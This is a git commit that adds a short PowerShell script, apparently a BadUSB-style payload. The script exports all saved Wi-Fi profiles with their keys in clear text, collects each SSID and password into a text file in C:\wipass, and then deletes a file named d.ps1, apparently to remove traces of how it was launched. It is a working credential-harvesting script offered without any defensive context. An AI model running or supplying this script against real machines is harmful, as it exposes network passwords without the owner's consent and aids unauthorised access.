169040c19a6186014112e1a002c8af657964adc2
Tomas Sanjuan <39006479+tomassj9@users.noreply.github.com>
2021-03-18 09:52:31 +0100

    Create script.ps1

---
+++ script.ps1
@@ -0,0 +1,13 @@
+$p = "C:\wipass"
+mkdir $p
+cd $p
+
+# Get all saved wifi password
+netsh wlan export profile key=clear
+dir *.xml |% {
+$xml=[xml] (get-content $_)
+$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
+Out-File wifipass.txt -Append -InputObject $a
+}
+
+rm d.ps1
